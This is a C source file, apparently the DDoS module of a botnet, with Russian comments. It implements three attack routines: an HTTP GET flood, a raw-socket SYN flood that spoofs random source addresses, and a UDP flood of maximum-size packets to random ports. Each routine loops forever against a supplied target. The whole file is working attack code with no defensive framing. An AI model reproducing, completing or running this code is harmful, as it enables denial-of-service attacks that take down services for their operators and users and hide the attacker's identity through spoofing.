// bot/ddos.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <pthread.h>
#include <time.h>
#include "config.h"

// HTTP флуд
void* http_flood(void* args) {
    char* target = (char*)args;
    char* host = strstr(target, "://");
    if(host) host += 3;
    else host = target;
    
    // Убираем путь
    char* slash = strchr(host, '/');
    if(slash) *slash = 0;
    
    struct addrinfo hints, *res;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    
    getaddrinfo(host, "80", &hints, &res);
    
    int sock_count = 10;
    int sockets[sock_count];
    
    // Создаем сокеты
    for(int i = 0; i < sock_count; i++) {
        sockets[i] = socket(AF_INET, SOCK_STREAM, 0);
        if(sockets[i] < 0) continue;
        
        // Неблокирующий режим
        int flags = fcntl(sockets[i], F_GETFL, 0);
        fcntl(sockets[i], F_SETFL, flags | O_NONBLOCK);
        
        connect(sockets[i], res->ai_addr, res->ai_addrlen);
    }
    
    char request[512];
    snprintf(request, sizeof(request),
        "GET /?%ld HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: Mozilla/5.0\r\n"
        "Accept: text/html\r\n"
        "Connection: keep-alive\r\n"
        "\r\n",
        time(NULL), host);
    
    // Атака
    while(1) {
        for(int i = 0; i < sock_count; i++) {
            if(sockets[i] > 0) {
                send(sockets[i], request, strlen(request), MSG_DONTWAIT);
            } else {
                // Переподключаемся
                sockets[i] = socket(AF_INET, SOCK_STREAM, 0);
                connect(sockets[i], res->ai_addr, res->ai_addrlen);
            }
        }
        
        usleep(HTTP_FLOOD_DELAY * 1000);
    }
    
    freeaddrinfo(res);
    return NULL;
}

// SYN флуд (raw sockets)
void* syn_flood(void* args) {
    char* target = (char*)args;
    struct sockaddr_in dest;
    
    dest.sin_family = AF_INET;
    dest.sin_port = htons(80);
    inet_aton(target, &dest.sin_addr);
    
    // Raw socket
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if(sock < 0) {
        perror("socket");
        return NULL;
    }
    
    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    
    char packet[4096];
    struct iphdr* ip = (struct iphdr*)packet;
    struct tcphdr* tcp = (struct tcphdr*)(packet + sizeof(struct iphdr));
    
    // Заполняем IP заголовок
    ip->ihl = 5;
    ip->version = 4;
    ip->tos = 0;
    ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    ip->id = htons(random());
    ip->frag_off = 0;
    ip->ttl = 255;
    ip->protocol = IPPROTO_TCP;
    ip->check = 0;
    ip->saddr = random(); // Случайный source IP
    ip->daddr = dest.sin_addr.s_addr;
    
    // Заполняем TCP заголовок
    tcp->source = htons(random() % 65535);
    tcp->dest = htons(80);
    tcp->seq = random();
    tcp->ack_seq = 0;
    tcp->doff = 5;
    tcp->syn = 1;
    tcp->window = htons(5840);
    tcp->check = 0;
    tcp->urg_ptr = 0;
    
    // Атака
    while(1) {
        for(int i = 0; i < SYN_FLOOD_PPS; i++) {
            // Меняем source IP и порт
            ip->saddr = random();
            ip->id = htons(random());
            tcp->source = htons(random() % 65535);
            tcp->seq = random();
            
            sendto(sock, packet, sizeof(struct iphdr) + sizeof(struct tcphdr),
                  0, (struct sockaddr*)&dest, sizeof(dest));
        }
        
        usleep(1000); // 1ms delay
    }
    
    close(sock);
    return NULL;
}

// UDP флуд
void* udp_flood(void* args) {
    char* target_ip = (char*)args;
    struct sockaddr_in dest;
    
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = inet_addr(target_ip);
    
    // Большие пакеты
    char payload[65507]; // Максимальный размер UDP пакета
    memset(payload, 0xFF, sizeof(payload));
    
    while(1) {
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if(sock < 0) continue;
        
        // Отправляем на случайные порты
        for(int i = 0; i < 100; i++) {
            dest.sin_port = htons(random() % 65535);
            sendto(sock, payload, sizeof(payload), 0,
                  (struct sockaddr*)&dest, sizeof(dest));
        }
        
        close(sock);
        usleep(10000); // 10ms
    }
    
    return NULL;
}